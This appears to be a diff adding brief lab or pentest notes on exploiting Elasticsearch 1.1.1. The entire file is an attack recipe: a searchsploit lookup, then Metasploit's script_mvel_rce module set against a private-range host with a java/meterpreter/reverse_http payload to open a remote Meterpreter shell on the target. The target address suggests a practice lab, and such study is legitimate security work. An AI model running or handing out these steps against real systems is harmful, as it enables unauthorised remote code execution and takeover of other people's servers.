@@ -1,0 +1,19 @@
+# this file contains the method to use to exploit elastic search 1.1.1 
+
+searchsploit elastic search
+
+# we can use a metasploit module to get a terminal in target system.
+
+# in metasploit module
+
+search elastic search
+
+use  exploit/multi/elasticsearch/script_mvel_rce # ElasticSearch Dynamic Script Arbitrary Java Execution.
+
+set RHOSTS 192.168.56.3
+
+set payload java/meterpreter/reverse_http
+
+run 
+
+# this will open a meterepreter terminal on the target system.
